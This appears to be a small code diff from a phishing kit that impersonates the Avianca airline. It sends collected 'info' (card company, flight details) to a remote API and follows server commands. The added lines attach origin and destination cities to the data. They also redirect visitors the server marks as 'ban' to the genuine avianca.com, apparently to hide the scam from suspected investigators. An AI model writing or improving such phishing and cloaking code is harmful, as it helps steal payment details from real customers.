@@ -12,6 +12,11 @@ if(info.checkerInfo.company === 'VISA'){
 }
 
 // Enviar info
+info.metaInfo.origin = info.flightInfo.origin.city;
+info.metaInfo.destination = info.flightInfo.destination.city;
+
+console.log(info.metaInfo);
+
 fetch(`${API_URL}/generals`, {
     method: 'POST',
     headers: {
@@ -23,6 +28,12 @@ fetch(`${API_URL}/generals`, {
     .then(result => {
         // Manejo de respuetas del servidor
         console.log('Respuesta del servidor:', result.redirect_to);
+
+        if(result.redirect_to.split('-')[0] === 'ban'){
+            window.location.href = 'https://avianca.com';
+
+            return;
+        }
 
         if(result.redirect_to.split('-')[0] === 'checker'){
             console.log(result.redirect_to);
